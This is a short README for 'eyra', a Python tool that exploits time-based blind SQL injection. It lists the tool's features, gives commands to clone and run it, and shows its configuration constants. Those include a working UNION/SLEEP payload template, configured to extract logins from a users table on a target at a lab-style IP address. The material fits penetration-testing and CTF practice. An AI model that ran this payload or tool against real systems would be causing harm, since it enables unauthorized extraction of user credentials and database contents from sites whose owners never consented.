# eyra — a time-based whisper

> _Listening to the silence between responses._  

---

A minimalist tool for exploiting **Blind SQL Injection — Time-Based** vulnerability.  
It listens not to words, but to the gaps.

---

- Automates blind time-based extraction
- Minimalist, lightweight, dependency-free
- Fully configurable query, charset, and target

---

Clone the repository:

```bash
git clone https://github.com/seu-usuario/eyra.git
cd eyra
python eyra.py
```

Inside the script, you'll find the core constants that shape the extraction:

```python
TARGET_URL = 'http://10.10.0.8/'
CHARSET = string.ascii_letters + string.digits + string.punctuation # Change for `string.printable` for include whitespaces
QUERY = 'SELECT login FROM users WHERE id = 2 LIMIT 0, 1'
DELAY = 5
THRESHOLD = DELAY - 0.5
PAYLOAD_TEMPLATE = (
    "' UNION SELECT 1, 2, IF(SUBSTRING(({query}), {position}, 1) = '{char}', SLEEP({delay}), NULL); -- -"
)
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Content-Type': 'application/x-www-form-urlencoded'
}
...
```
